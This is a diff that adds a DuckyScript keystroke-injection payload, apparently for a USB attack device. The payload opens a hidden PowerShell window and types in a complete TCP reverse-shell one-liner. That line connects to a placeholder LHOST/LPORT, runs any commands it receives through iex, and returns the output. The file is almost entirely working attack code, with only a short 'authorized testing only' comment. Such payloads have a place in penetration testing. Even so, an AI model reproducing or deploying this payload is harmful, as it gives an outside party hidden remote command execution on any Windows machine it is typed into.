@@ -1,0 +1,10 @@
+REM Windows PowerShell reverse shell — edit LHOST/LPORT, start a listener first.
+REM Authorized testing only. Pair with the Reverse Shell card's listener.
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -w hidden -nop
+ENTER
+DELAY 1000
+STRING $c=New-Object Net.Sockets.TCPClient('LHOST',LPORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length);$s.Flush()}
+ENTER
